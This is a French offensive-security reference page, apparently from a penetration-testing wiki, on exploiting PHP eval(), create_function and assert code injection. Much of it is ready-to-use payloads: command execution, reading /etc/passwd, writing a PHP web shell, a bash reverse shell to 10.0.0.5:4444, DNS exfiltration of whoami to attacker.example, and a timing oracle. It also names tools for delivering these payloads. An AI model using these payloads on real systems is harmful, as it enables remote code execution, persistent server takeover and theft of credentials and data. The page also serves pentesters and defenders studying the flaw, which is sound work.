---
title: "Injection eval() PHP : exécution de code arbitraire depuis un puits dynamique"
description: "eval() exécute son argument chaîne comme du PHP, donc une entrée contrôlée par l'attaquant qui l'atteint exécute du code arbitraire dans le processus interpréteur, avec create_function et assert comme puits d'évaluation dynamique voisins."
keywords:
  - injection eval PHP
  - RCE eval
  - create_function
  - exécution de code assert
  - system exec shell_exec
  - injection de code PHP
---

# eval()

`eval()` prend une chaîne et l'exécute comme du code PHP dans le processus interpréteur courant. Lorsqu'une partie quelconque de cette chaîne est contrôlée par l'attaquant, l'attaquant exécute du PHP, ce qui est une exécution de code à distance avec les privilèges, les extensions chargées et les connexions ouvertes du processus en cours. Il s'agit d'une exécution véritable et non restreinte, pas d'un évaluateur de formules confiné.

## Le puits et ses voisins

Le puits canonique est `eval()`, qui exige que son argument soit du PHP syntaxiquement complet et attend que les instructions soient terminées.

```php
eval("\$result = $userInput;");
eval($userInput);
```

Deux voisins évaluent des chaînes comme du code de la même façon et sont traités de façon identique :

- `create_function($args, $body)` construit une fonction dont le corps est la chaîne fournie, de sorte qu'un `$body` contrôlé est exécuté lorsque la fonction est appelée. Il a été supprimé en PHP 8 mais reste courant dans le code ancien.
- `assert($userInput)` évaluait un argument chaîne comme du PHP dans les versions jusqu'à 7.x, rendant un argument contrôlé équivalent à `eval`.

```php
$fn = create_function('$x', $userInput);   // body is code
assert($userInput);                          // string argument is code
```

## Exploitation

Comme la chaîne s'exécute comme du PHP, escaladez directement vers l'exécution de commande au travers de l'une des fonctions d'exécution de processus ou de l'opérateur backtick. Fermez le contexte syntaxique attendu par le puits, exécutez le payload, et supprimez le reste.

```php
# Into eval("$result = $userInput;");
system('id');//
`id`;//
shell_exec('uname -a');//
```

Terminez l'instruction injectée par `;` et commentez le fragment restant (`//` ou `#`) pour que le template environnant reste valide. Là où les fonctions de commande directes sont désactivées, PHP lui-même reste pleinement disponible pour l'accès aux fichiers et au réseau.

```php
file_get_contents('/etc/passwd');//
file_put_contents('shell.php', '<?php system($_GET[0]);');//
```

La chaîne injectée s'exécute dans le processus PHP, donc elle hérite aussi des handles de base de données, de l'état de session et des identifiants chargés de ce processus, qui sont atteignables avec du PHP ordinaire sans aucun autre point d'ancrage.

## Confirmer l'exécution

Prouvez que le code s'exécute avec une expression dont la sortie ne peut pas être une copie renvoyée de l'entrée.

```php
print(8111*9);//
```

Une réponse contenant `72999` confirme que la chaîne a été exécutée plutôt que renvoyée. Un `uid=33(www-data)` renvoyé par `system('id')` confirme alors à la fois l'exécution et le compte de service, d'où un point d'ancrage interactif complet s'ensuit.

```php
system('bash -c "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"');//
```

## Exécution à l'aveugle

Lorsque la sortie n'est pas renvoyée, pilotez un signal hors bande ou un oracle temporel, de la même façon que pour tout puits d'exécution de code à l'aveugle.

```php
system('nslookup $(whoami).attacker.example');//
usleep(10000000);//
```

Un délai de dix secondes confirme l'exécution là où ni renvoi ni egress ne sont disponibles, et associer le délai à une condition le transforme en oracle booléen sur l'état de l'hôte.

## Outils

- **Burp Suite** : Repeater pour délivrer des payloads eval et lire la sortie de commande.
- **tplmap** : détecte et exploite l'injection de code PHP basée sur eval().

## Références

- [PHP manual: eval](https://www.php.net/manual/en/function.eval.php)
- [PHP manual: assert](https://www.php.net/manual/en/function.assert.php)
- [OWASP: Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [PayloadsAllTheThings: PHP command injection and code evaluation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
